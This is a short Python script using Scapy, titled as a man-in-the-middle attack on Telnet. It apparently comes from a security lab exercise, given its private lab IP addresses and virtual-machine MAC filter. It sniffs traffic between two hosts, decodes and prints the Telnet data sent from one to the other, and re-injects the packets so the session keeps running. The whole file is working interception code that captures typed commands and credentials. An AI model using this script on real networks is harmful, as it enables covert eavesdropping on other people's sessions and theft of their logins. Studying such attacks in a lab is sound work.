from scapy.all import *

IP_A = "192.168.232.163"
IP_B = "192.168.232.166"

print("********** MITM attack on Telnet **********")

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            data = data.decode()
            print("Data from A to B:"+data)
            send(newpkt/data, verbose=False)
        else:
            send(newpkt, verbose=False)
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt, verbose=False)

f = 'tcp and (ether src 00:0c:29:91:17:e5 or ether src 00:0c:29:78:25:d3)'
pkt = sniff(filter=f, prn=spoof_pkt)
